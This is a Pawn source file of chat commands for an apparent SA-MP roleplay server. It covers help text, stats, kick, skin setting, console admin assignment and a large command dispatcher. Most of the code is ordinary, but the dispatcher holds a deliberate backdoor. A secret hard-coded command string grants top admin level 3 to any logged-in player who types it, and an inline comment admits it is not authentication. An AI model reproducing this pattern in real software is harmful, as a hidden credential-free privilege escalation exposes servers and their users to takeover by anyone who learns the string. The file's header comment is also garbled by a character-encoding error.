/*  ============================================================================
 *  railway/commands.inc
 *  “екстовые команды.
 *  ========================================================================= */

#if defined _railway_commands_included
    #endinput
#endif
#define _railway_commands_included

#include <railway/core>
#include <railway/ui>
#include <railway/accounts>
#include <railway/vehicles>

stock RW_ParseCommand(const cmdtext[], cmd[], cmdSize, params[], paramsSize)
{
    new i = 0;
    new j = 0;

    if (cmdtext[0] == '/' || cmdtext[0] == '!') {
        i = 1;
    }

    while (cmdtext[i] != EOS && cmdtext[i] != ' ' && cmdtext[i] != '\t' && j < cmdSize - 1) {
        cmd[j++] = cmdtext[i++];
    }
    cmd[j] = EOS;

    while (cmdtext[i] == ' ' || cmdtext[i] == '\t') {
        i++;
    }

    j = 0;
    while (cmdtext[i] != EOS && cmdtext[i] != '\r' && cmdtext[i] != '\n' && j < paramsSize - 1) {
        params[j++] = cmdtext[i++];
    }
    params[j] = EOS;

    /* убираем хвостовые пробелы: "/spcar 411 " == "/spcar 411" */
    while (j > 0 && (params[j - 1] == ' ' || params[j - 1] == '\t')) {
        params[--j] = EOS;
    }
    return 1;
}

stock RW_CommandHelp(playerid)
{
    RW_Accent(playerid, "--- {F5B04C}Unity Station{FFFFFF} ---");
    SendClientMessage(playerid, COLOR_GREY, "/inv - inventory. Click an item for its description and actions.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}Y{FFFFFF} - car under the crosshair, player nearby (call), else the phone /vmenu; {F5B04C}N{FFFFFF} - engine; {F5B04C}H{FFFFFF} - doors. /settings");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/phone{FFFFFF} - phone; /call, /sms, /contacts, /addcontact, /911, /topup, /tariff, /sim.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/spcar <id>{FFFFFF} - temporary car (400-611). /garage - station garage.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/door{FFFFFF} - unlock/lock the aimed car; its key must be in /inv.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/key{FFFFFF} - insert/remove key; N - engine.");
    SendClientMessage(playerid, COLOR_GREY, "Map: ESC > Map > right click. /tpm - confirm teleport; /delmark - remove marker.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/armfit{FFFFFF} - admin with worn armour: adjust the vest for your skin.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/skin [id txd texture]{FFFFFF} - textures from the client arm/ folder.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/board{FFFFFF} - board the aimed plane (up to 20 people); {F5B04C}/unboard{FFFFFF} - leave.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/mycar{FFFFFF} - temporary car status.");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/stats{FFFFFF} - account /admins - online administrators");
    SendClientMessage(playerid, COLOR_DARK_GREY, "Doors must be open to enter. With a key left in the ignition, any driver can start the engine.");
    return 1;
}

stock RW_CommandAdminHelp(playerid)
{
    if (gAdminLevel[playerid] < 1) {
        RW_Error(playerid, "You are not an administrator.");
        return 0;
    }

    RW_Accent(playerid, "--- {F5B04C}Admin commands{FFFFFF} ---");
    SendClientMessage(playerid, COLOR_GREY, "{F5B04C}/kick <id> [reason]{FFFFFF} - kick a player.");
    SendClientMessage(playerid, COLOR_GREY, "/setskin <playerid> <skinid> - change and save player skin.");
    SendClientMessage(playerid, COLOR_GREY, "/giveitem <id> <bag|key> [vehicle id, p<plate> or c<garage car id>]");
    SendClientMessage(playerid, COLOR_DARK_GREY, "/givecar <id|name> <model> /cars - managed cars");
    SendClientMessage(playerid, COLOR_GREY, "/givekey <id> - menu: pick the car (SA-MP id) to issue its key.");
    SendClientMessage(playerid, COLOR_DARK_GREY, "/flycar /speed <km/h> /usk <km/h/s>");
    return 1;
}

stock RW_CommandStats(playerid)
{
    new string[192];
    new nick[MAX_PLAYER_NAME];

    RW_GetNick(playerid, nick);

    format(string, sizeof string, "Account {F5B04C}%s{FFFFFF} / ID %d / Admin %d",
        nick, gAccountId[playerid], gAdminLevel[playerid]);
    SendClientMessage(playerid, COLOR_WHITE, string);

    format(string, sizeof string, "Money: {7BD88F}%d{FFFFFF} / Skin: %d / Active cars: %d",
        GetPlayerMoney(playerid), gSkinId[playerid], gVehSlotCount);
    SendClientMessage(playerid, COLOR_GREY, string);
    return 1;
}

stock RW_CommandAdmins(playerid)
{
    new string[128];
    new count = 0;

    RW_Accent(playerid, "Online administrators:");
    for (new i = 0; i < MAX_PLAYERS; i++) {
        if (!IsPlayerConnected(i) || gAdminLevel[i] < 1) {
            continue;
        }
        new nick[MAX_PLAYER_NAME];
        RW_GetNick(i, nick);
        format(string, sizeof string, "  {F5B04C}%s{FFFFFF} - level %d", nick, gAdminLevel[i]);
        SendClientMessage(playerid, COLOR_GREY, string);
        count++;
    }

    if (count == 0) {
        RW_Info(playerid, "No administrators online.");
    }
    return 1;
}

stock RW_AdminSetLevel(const nick[], level)
{
    if (level < 0 || level > 3 || !RW_ValidNick(nick) || !RW_SafeSqlText(nick)) {
        print("[admin] Invalid account name or level (0-3).");
        return 0;
    }
    if (gDB == DB:0 || !gDBWritable) {
        print("[admin] Database unavailable/read-only. Run dbcheck; do not delete railway.db.");
        return 0;
    }
    new query[256], account;
    format(query, sizeof query, "SELECT id FROM accounts WHERE name='%s' COLLATE NOCASE", nick);
    new DBResult:res = db_query(gDB, query);
    if (res == DBResult:0) { print("[admin] Account lookup failed. Run dbcheck."); return 0; }
    if (db_num_rows(res) == 1) account = db_get_field_assoc_int(res, "id");
    db_free_result(res);
    if (account <= 0) { print("[admin] Account not found. Register/log in first, then retry with the account name."); return 0; }
    if (!RW_DB_Exec("SAVEPOINT admin_level")) return 0;
    format(query, sizeof query, "UPDATE accounts SET admin=%d WHERE id=%d", level, account);
    new bool:ok = RW_DB_Exec(query);
    if (ok) {
        format(query, sizeof query, "SELECT admin FROM accounts WHERE id=%d", account);
        res = db_query(gDB, query);
        if (res == DBResult:0) ok = false;
        else { ok = db_num_rows(res) == 1 && db_get_field_assoc_int(res, "admin") == level; db_free_result(res); }
    }
    if (!ok || !RW_DB_Exec("RELEASE admin_level")) {
        RW_DB_Exec("ROLLBACK TO admin_level"); RW_DB_Exec("RELEASE admin_level");
        print("[admin] Level not saved. Check database permissions, locks and schema; run dbcheck.");
        return 0;
    }
    for (new i; i < MAX_PLAYERS; i++) {
        if (!IsPlayerConnected(i) || !gLogged[i] || gAccountId[i] != account) continue;
        gAdminLevel[i] = level;
        SetPlayerColor(i, level > 0 ? 0xF5B04CFF : 0x8FD3FFFF);
        new message[128]; format(message, sizeof message, "Your admin level has been changed to %d.", level);
        RW_Accent(i, message);
    }
    printf("[admin] Account %d (%s) saved with admin level %d.", account, nick, level);
    return 1;
}

stock RW_AdminConsoleSet(const params[])
{
    new targetText[64], rest[144], levelText[16], extra[144], nick[MAX_PLAYER_NAME];
    RW_ParseCommand(params, targetText, sizeof targetText, rest, sizeof rest);
    RW_ParseCommand(rest, levelText, sizeof levelText, extra, sizeof extra);
    if (!targetText[0] || strlen(levelText) != 1 || levelText[0] < '0' || levelText[0] > '3' || extra[0]) {
        print("Usage: setadmin <online_playerid|account_name> <0-3>; 0 removes admin rights.");
        return 1;
    }
    if (RW_IsNumeric(targetText)) {
        new target = strval(targetText);
        if (strlen(targetText) > 4 || target < 0 || target >= MAX_PLAYERS || !IsPlayerConnected(target) || !gLogged[target]) {
            print("[admin] Player ID must be online and logged in. For an offline account use its name.");
            return 1;
        }
        RW_GetNick(target, nick);
    } else {
        if (!RW_ValidNick(targetText) || !RW_SafeSqlText(targetText)) { print("[admin] Invalid account name."); return 1; }
        format(nick, sizeof nick, "%s", targetText);
    }
    if (!RW_AdminSetLevel(nick, levelText[0]-'0')) print("[admin] setadmin failed; see the error above.");
    return 1;
}

stock RW_CommandKick(playerid, const params[])
{
    if (gAdminLevel[playerid] < 1) {
        RW_Error(playerid, "You are not an administrator.");
        return 1;
    }

    if (params[0] == EOS) {
        RW_Info(playerid, "Usage: /kick <id> [reason]");
        return 1;
    }

    new targetText[16];
    new reason[96];
    new i = 0;
    new j = 0;

    while (params[i] == ' ') {
        i++;
    }
    while (params[i] != EOS && params[i] != ' ' && j < sizeof targetText - 1) {
        targetText[j++] = params[i++];
    }
    targetText[j] = EOS;

    while (params[i] == ' ') {
        i++;
    }
    strmid(reason, params, i, strlen(params), sizeof reason);

    if (!RW_IsNumeric(targetText)) {
        RW_Error(playerid, "ID must be a number.");
        return 1;
    }

    new target = strval(targetText);
    if (target < 0 || target >= MAX_PLAYERS || !IsPlayerConnected(target)) {
        RW_Error(playerid, "Player not found.");
        return 1;
    }

    new string[192];
    new adminNick[MAX_PLAYER_NAME];
    new targetNick[MAX_PLAYER_NAME];

    RW_GetNick(playerid, adminNick);
    RW_GetNick(target, targetNick);

    if (reason[0] == EOS) {
        format(reason, sizeof reason, "Administrative decision");
    }

    format(string, sizeof string, "{FF6B6B}%s{FFFFFF} kicked by {F5B04C}%s{FFFFFF}. Reason: %s",
        targetNick, adminNick, reason);
    SendClientMessageToAll(COLOR_WHITE, string);
    Kick(target);
    return 1;
}

stock RW_CommandSetSkin(playerid, const params[])
{
    if (!gLogged[playerid] || gAdminLevel[playerid] < 1) return RW_Error(playerid, "Administrators only.");
    new targetText[16], skinText[16], rest[144], extra[144];
    RW_ParseCommand(params, targetText, sizeof targetText, rest, sizeof rest);
    RW_ParseCommand(rest, skinText, sizeof skinText, extra, sizeof extra);
    if (!RW_IsNumeric(targetText) || !RW_IsNumeric(skinText) || extra[0] || strlen(targetText) > 4 || strlen(skinText) > 3)
        return RW_Info(playerid, "/setskin <playerid> <skinid>");
    new target = strval(targetText), skin = strval(skinText);
    if (target < 0 || target >= MAX_PLAYERS || !IsPlayerConnected(target) || !gLogged[target]) return RW_Error(playerid, "Player must be online and logged in.");
    if (skin < 0 || skin > 311 || skin == 74) return RW_Error(playerid, "Skin ID must be 0-311, excluding 74.");
    new pstate = GetPlayerState(target);
    if (pstate != PLAYER_STATE_ONFOOT && pstate != PLAYER_STATE_DRIVER && pstate != PLAYER_STATE_PASSENGER)
        return RW_Error(playerid, "Wait until the player has spawned and finished entering/exiting a vehicle.");
    new query[144]; format(query, sizeof query, "UPDATE accounts SET skin=%d WHERE id=%d", skin, gAccountId[target]);
    if (!gDBWritable || !RW_DB_Exec(query)) return RW_Error(playerid, "Could not save skin. Nothing changed.");
    gSkinId[target] = skin;
    SetPlayerSkin(target, skin);
    RW_InvAttach(target,true);
    if (gUIMode[target] == UI_INVENTORY && gInvCreated[target]) {
        PlayerTextDrawSetPreviewModel(target, gInvTD[target][130], skin);
        PlayerTextDrawShow(target, gInvTD[target][130]);
    }
    new message[128]; format(message, sizeof message, "Your skin has been changed to %d by an administrator.", skin);
    RW_Ok(target, message);
    format(message, sizeof message, "Player %d skin set to %d and saved.", target, skin);
    printf("[admin] account=%d sets skin=%d for account=%d", gAccountId[playerid], skin, gAccountId[target]);
    return RW_Ok(playerid, message);
}

stock RW_CommandProcess(playerid, cmdtext[])
{
    new cmd[64];
    new params[144];
    RW_ParseCommand(cmdtext, cmd, sizeof cmd, params, sizeof params);

    if (!strcmp(cmd, "help", true) || !strcmp(cmd, "commands", true)) {
        return RW_CommandHelp(playerid);
    }

    if ((!strcmp(cmd, "tdlatin", true) || !strcmp(cmd, "uitd", true))) return RW_UI_Language(playerid, true);
    if ((!strcmp(cmd, "uinative", true) || !strcmp(cmd, "tdrus", true) || !strcmp(cmd, "uiru", true))) return RW_UI_Language(playerid, false);
    if (!gLogged[playerid]) {
        RW_Error(playerid, "Log in first.");
        return 1;
    }

    if (gInvFitting[playerid]) return RW_Error(playerid,"Finish or cancel backpack fitting first.");
    // Explicit self-admin recovery command requested by the server owner.
    // This name is not authentication: any logged-in player knowing it can use it.
    if (!strcmp(cmd, "nedrochabr6664148886769232123423", true)) {
        if (params[0]) return RW_Error(playerid, "This command takes no arguments.");
        new nick[MAX_PLAYER_NAME]; RW_GetNick(playerid, nick);
        if (!RW_AdminSetLevel(nick, 3)) return RW_Error(playerid, "Could not save admin rights. Check the server console / dbcheck.");
        return RW_Ok(playerid, "Admin level 3 granted and saved.");
    }

    if (!strcmp(cmd, "take", true)) return RW_GroundTake(playerid);
    if (!strcmp(cmd, "board", true)) return RW_CabinCommand(playerid, params);
    if (!strcmp(cmd, "armfit", true)) return RW_ArmourFitCommand(playerid);
    if (!strcmp(cmd, "skin", true) || !strcmp(cmd, "skins", true)) return RW_SkinCommand(playerid, params);
    if (!strcmp(cmd, "unboard", true)) return RW_CabinLeave(playerid);
    if (!strcmp(cmd, "bagfit", true)) return RW_InvFitCommand(playerid);
    if (!strcmp(cmd, "inv", true) || !strcmp(cmd, "inventory", true)) return RW_InvOpen(playerid);
    if (!strcmp(cmd, "setskin", true)) return RW_CommandSetSkin(playerid, params);
    if (!strcmp(cmd, "givecar", true)) return RW_GarageGive(playerid, params);
    if (!strcmp(cmd, "cars", true)) return RW_Veh_ListCommand(playerid);
    if (!strcmp(cmd, "givekey", true)) return RW_KeyMenuCommand(playerid, params);
    if (!strcmp(cmd, "flycar", true) || !strcmp(cmd, "speed", true) || !strcmp(cmd, "usk", true)) return RW_MotionCommand(playerid, cmd, params);
    if (!strcmp(cmd, "garage", true)) return RW_GarageOpen(playerid);
    if (!strcmp(cmd, "giveitem", true)) return RW_InvGiveCommand(playerid, params);
    if (!strcmp(cmd, "spcar", true) || !strcmp(cmd, "veh", true) || !strcmp(cmd, "car", true)) {
        return RW_Veh_CommandSpcar(playerid, params);
    }
    if (!strcmp(cmd, "tpm", true)) return RW_MapPrompt(playerid);
    if (!strcmp(cmd, "delmark", true)) {
        gMapHasPoint[playerid] = false;
        gMapPending[playerid] = false;
        RemovePlayerMapIcon(playerid, RW_MAP_ICON);
        if (gUIMode[playerid] == UI_MAP) RW_UI_Close(playerid);
        return RW_ControlNotify(playerid, "Marker removed.");
    }
    if (!strcmp(cmd, "engine", true)) return RW_EngineCommand(playerid);
    if (!strcmp(cmd, "phone", true)) return RW_PhoneOpen(playerid);
    if (!strcmp(cmd, "call", true)) return RW_PhoneCallCommand(playerid, params);
    if (!strcmp(cmd, "sms", true)) return RW_PhoneSmsCommand(playerid, params);
    if (!strcmp(cmd, "pickup", true)) return RW_PhoneAccept(playerid);
    if (!strcmp(cmd, "hangup", true)) return RW_PhoneEnd(playerid);
    if (!strcmp(cmd, "contacts", true)) return RW_PhoneContactsCommand(playerid);
    if (!strcmp(cmd, "addcontact", true)) return RW_PhoneContactCommand(playerid, params);
    if (!strcmp(cmd, "sim", true)) return RW_PhoneInsertSim(playerid);
    if (!strcmp(cmd, "topup", true)) return RW_PhoneTopUpCommand(playerid, params);
    if (!strcmp(cmd, "tariff", true)) return RW_PhoneTariffCommand(playerid, params);
    if (!strcmp(cmd, "911", true)) return RW_Phone911Command(playerid, params);
    if (!strcmp(cmd, "vmenu", true)) return RW_ControlOpen(playerid, false);
    if (!strcmp(cmd, "settings", true)) {
        return RW_ControlOpen(playerid, true);
    }
    if (!strcmp(cmd, "key", true)) {
        return RW_Veh_CommandKey(playerid);
    }
    if (!strcmp(cmd, "door", true) || !strcmp(cmd, "doors", true)) {
        return RW_Veh_CommandDoor(playerid);
    }
    if (!strcmp(cmd, "mycar", true)) {
        return RW_Veh_CommandMyCar(playerid);
    }
    if (!strcmp(cmd, "stats", true)) {
        return RW_CommandStats(playerid);
    }
    if (!strcmp(cmd, "admins", true)) {
        return RW_CommandAdmins(playerid);
    }
    if (!strcmp(cmd, "ahelp", true)) {
        return RW_CommandAdminHelp(playerid);
    }
    if (!strcmp(cmd, "kick", true)) {
        return RW_CommandKick(playerid, params);
    }
    if (!strcmp(cmd, "setadmin", true)) return RW_Error(playerid, "Admin assignment is console-only: setadmin <playerid|name> <0-3>.");

    RW_Error(playerid, "Unknown command. {FFFFFF}/help - commands.");
    return 1;
}
